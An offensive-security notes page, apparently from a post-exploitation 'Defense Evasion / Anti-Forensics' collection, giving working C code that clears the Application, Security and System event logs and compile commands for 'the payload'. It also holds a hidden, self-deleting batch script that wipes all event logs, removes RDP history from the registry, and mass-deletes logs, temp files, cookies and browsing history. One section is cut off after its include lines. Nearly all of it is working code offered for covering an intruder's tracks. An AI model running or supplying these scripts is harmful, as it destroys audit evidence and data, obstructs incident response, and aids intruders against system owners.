# Clear Event Logs

## ClearEventLog

Clear a single event log.

```c
#include <stdio.h>
#include <windows.h>
#include <errhandlingapi.h>
#include <winbase.h>

#pragma comment(lib, "advapi32.lib")

int main() {
    HANDLE handle_event_log;
    LPCSTR event_log_name = "Application";

    // Open the event log
    handle_event_log = OpenEventLog(NULL, event_log_name);
    if (handle_event_log == NULL) {
        printf("Failed to open event log. Error: %lu\n", GetLastError());
        return 1;
    }

    // Clear the event log without saving a backup
    if (ClearEventLog(handle_event_log, NULL) == 0) {
        printf("Failed to clear event log. Error: %lu\n", GetLastError());
        CloseEventLog(handle_event_log);
        return 1;
    }

    printf("Successfully cleared the event log: %s\n", event_log_name);

    CloseEventLog(handle_event_log);

    return 0;
}
```

Clear multiple event logs.

```c
#include <stdio.h>
#include <windows.h>
#include <errhandlingapi.h>
#include <winbase.h>

#pragma comment(lib, "advapi32.lib")

int main() {
    HANDLE handle_event_log;
    LPCSTR event_log_names[] = {"Application", "Security", "System"};

    // Loop through each log and attempt to clear it
    for (int i = 0; i < sizeof(event_log_names) / sizeof(event_log_names[0]); i++) {
        // Open the event log
        handle_event_log = OpenEventLog(NULL, event_log_names[i]);
        if (handle_event_log == NULL) {
            printf("Failed to open event log: %s. Error: %lu\n", event_log_names[i], GetLastError());
            continue;  // Move to the next log if opening fails
        }

        // Clear the event log without saving a backup
        if (ClearEventLog(handle_event_log, NULL) == 0) {
            printf("Failed to clear event log: %s. Error: %lu\n", event_log_names[i], GetLastError());
        } else {
            printf("Successfully cleared the event log: %s\n", event_log_names[i]);
        }

        CloseEventLog(handle_event_log);
    }

    return 0;
}
```

To compile the payload.

```
$ x86_64-w64-mingw32-gcc -l advapi32 -o wipe_logs.exe wipe_logs.c
```

## ClearEventLogA

```c
#include <stdio.h>
#include <windows.h>
#include <winbase.h>

#pragma comment(lib, "advapi32.lib")
```

To compile the payload.

```
$ x86_64-w64-mingw32-gcc -l advapi32 -o wipe_logs.exe wipe_logs.c
```

## Batch

A batch script to wipe the files.

```batch
:start
cmdow @ /HID

timeout.exe /t 5

for /f "tokens=1,2*" %%V in ('bcdedit.exe') do set adminTest=%%V
if (%adminTest%)==(Access) goto noAdmin
for /f "tokens=*" %%G in ('wevtutil.exe enum-logs') do (call :clear_log "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd

:clear_log
echo clearing %1
wevtutil.exe clear-log %1
goto :eof

:noAdmin
echo Administrative privileges is required!
echo.

:theEnd
rd /s /q %SYSTEMDRIVE%\$RECYCLE.BIN
rd /s /q  %SYSTEMDRIVE%\recycler
reg.exe delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
reg.exe delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
reg.exe add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
cd %USERPROFILE%\Documents\
attrib.exe Default.rdp -s -h

del /s /q /a c:\*.log
del /s /q /a c:\*.tmp
del /f /s /q /a "%USERPROFILE%\Roaming\Macromedia\*"
del /f /s /q /a "%USERPROFILE%\Roaming\Adobe\*"
del /f /s /q /a "C:\Windows\Temp\*"
del /f /s /q /a "C:\Temp\*"
del /f /s /q /a "%USERPROFILE%\AppData\Local\Temp\*"
del /f /s /q %TEMP%\*
cd %USERPROFILE%\AppData\Local\Temp
rmdir /s /q %USERPROFILE%\AppData\Local\Temp
pushd %TEMP% && rd /s /q . > nul 2>&1
pushd %WINDIR%\TEMP && rd /s /q . > nul 2>&1
pushd %TMP% && rd /s /q . > nul 2>&1
pushd %WINDIR%\TMP && rd /s /q . > nul 2>&1
pushd %TEMP% && rd /s /q . > nul 2>&1
pushd %WINDIR%\Temp && rd /s /q . > nul 2>&1
pushd %TMP% && rd /s /q . > nul 2>&1
pushd %WINDIR%\tmp && rd /s /q . > nul 2>&1
pushd "%USERPROFILE%\Local Settings\Application Data\Temp" && rd /s /q . > nul 2>&1
pushd "%USERPROFILE%\AppData\Roaming\Adobe\" && rd /s /q . > nul 2>&1
pushd "%USERPROFILE%\Local Settings\Temporary Internet Files\" && rd /s /q . > nul 2>&1
pushd "%USERPROFILE%\Local Settings\History" && rd /s /q . > nul 2>&1
pushd %USERPROFILE%\Cookies && rd /s /q . > nul 2>&1

pushd "%USERPROFILE%\Application Data\Microsoft\CryptNetURLCache\Content\" && rd /s /q . > nul 2>&1
pushd "%USERPROFILE%\Application Data\Microsoft\CryptNetURLCache\MetaData\" && rd /s /q . > nul 2>&1
pushd "%USERPROFILE%\Local Settings\Application Data\IconCache.db" && rd /s /q . > nul 2>&1
pushd "C:\Documents and Settings\All Users\Application Data\Temp\" && rd /s /q . > nul 2>&1
pushd "C:\Documents and Settings\Default User\Cookies\" && rd /s /q . > nul 2>&1
pushd "C:\Documents and Settings\Default User\Local Settings\Temp\" && rd /s /q . > nul 2>&1
pushd "C:\Documents and Settings\Default User\Local Settings\Temporary Internet Files\" && rd /s /q . > nul 2>&1
pushd "C:\Documents and Settings\LocalService\Cookies\" && rd /s /q . > nul 2>&1
pushd "C:\Documents and Settings\LocalService\Local Settings\Temporary Internet Files\" && rd /s /q . > nul 2>&1

del /f /s /q /a "%USERPROFILE%\AppData\Roaming\Download Master\temp\*"
del /f /s /q /a "%USERPROFILE%\AppData\Roaming\Download Master\logs\*"

del %0
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x01 - Defense Evasion/13 - Anti-Forensics/Windows/Clear Traces/04 - Clear Logs/Delete Logs/Event Logs/Manual/Living off the Land]]

### Microsoft

- [WinAPI Documentation: `OpenEventLogA`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-openeventloga)

- [WinAPI Documentation: `OpenEventLogW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-openeventlogw)

- [WinAPI Documentation: `ClearEventLog`](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/eventlogprov/cleareventlog-method-in-class-win32-nteventlogfile)

- [WinAPI Documentation: `ClearEventLogA`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-cleareventloga)

- [WinAPI Documentation: `ClearEventLogW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-cleareventlogw)

- [WinAPI Documentation: `CloseEventLog`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-closeeventlog)